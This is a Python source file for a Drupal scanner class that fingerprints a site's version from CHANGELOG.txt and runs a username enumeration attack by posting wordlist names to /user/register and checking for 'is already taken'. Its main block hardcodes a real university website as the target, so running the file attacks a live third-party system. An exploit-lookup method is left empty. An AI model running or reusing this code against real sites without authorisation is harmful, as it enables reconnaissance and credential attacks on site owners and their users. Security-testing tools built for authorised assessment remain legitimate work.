#!/usr/bin/python3
import requests
import re
from core.colors import bad,green,yellow,good,red,end,white,res
import os
from concurrent.futures import ThreadPoolExecutor as TPE


class DrupalScanner:
    pythonpath = os.environ['PYTHONPATH'].split(os.pathsep)
    project_root = os.path.abspath(pythonpath[0])
    
    def __init__(self, url):
        self.url = url
        self.module_common_file = "LICENSE.txt"
        self.plugins_base_url = "sites/all/module/"
        self.plugins_dir = self.project_root+'/db/drupal/plugins.txt'

    """
    Enumerate  Drupal Plugins on Vulnerable Server 
    """
    def search_exploits(self,version):
        pass
            

    def check_version(self, method=''):
        url = self.url
        if method == 'C':
            if not url.endswith('/'):
                url = url + '/CHANGELOG.txt'
            else:
                url = url + "CHANGELOG.txt"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                match = re.search(r'Drupal (\d+(\.\d+)*)', response.text)
                if match:
                    version = match.group(1)
                    return version
                else:
                    return False
            else:
                return f"{red}{response.status_code} {end}"
        except requests.exceptions.RequestException as e:
            return False

    """
    Enumerate Valid Users
    """
    def username_enumeration(self,userfile=None):
        if userfile != None:
            wordlist = os.path.join(self.project_root+'/db/',userfile)
        else:
            wordlist = self.project_root + '/db/top-usernames-shortlist.txt'
        
        target_url = self.url + '/user/register'
        
        headers = {
            'Cookie': 'has_js=1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Te': 'trailers'
        }

        try:
            resp = requests.get(target_url)
            resp.raise_for_status()
            print(f"{good}{green}Enumerating Users")
            with open(wordlist, 'r') as f:
                for username in f.readlines():
                    username = username.strip("\n")
                    payload = {'name':username,'mail':'','timezone':'UTC','form_id':'user_register_form','op':'Create+new+account'}
                    try:
                        r = requests.post(target_url, data=payload,headers=headers)
                        r.raise_for_status()  
                        if f'is already taken.' in r.text:
                            print(f"\n[-]{green}Username: {yellow}{username}{white} Found\n")
                        else:
                            print(f"\n[-]{green}Username:{red}{username}{white} is not Found\n")

                    except requests.RequestException as e:
                        print(f"Error in making POST request for {username}: {e}")
                    except KeyboardInterrupt as e:
                        print(f"{bad}{red}Program Stop by User")
                        exit(0)
        except requests.RequestException as e:
            print(f"{bad}Error in making GET request to {target_url}: {e}")
            exit()
            

    def scan(self):
        print(f"{good} {green}Scanning Drupal Website: {self.url}")
        version = self.check_version()
        if version:
            print(f"{res}Found Target Version: {yellow}{version}\n")
        else:
            print(f"{bad}Failed to get the version of the website.")
        print("Starting Username Enumeration Attack")
        self.username_enumeration()
            


if __name__ == "__main__":
    sc = DrupalScanner('https://mega.rutgers.edu/')
    sc.scan()
